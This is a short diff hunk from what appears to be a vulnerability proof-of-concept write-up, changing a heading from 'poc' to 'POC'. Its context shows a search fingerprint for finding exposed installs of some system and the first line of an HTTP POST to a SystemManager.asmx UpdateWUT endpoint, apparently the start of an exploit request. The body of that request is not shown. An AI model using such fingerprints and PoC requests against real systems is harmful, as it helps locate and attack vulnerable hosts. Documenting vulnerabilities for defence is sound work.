@@ -8,7 +8,7 @@
 body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
 ```
 
-## poc
+## POC
 
 ```
 POST /DataSrvs/SystemManager.asmx/UpdateWUT HTTP/1.1
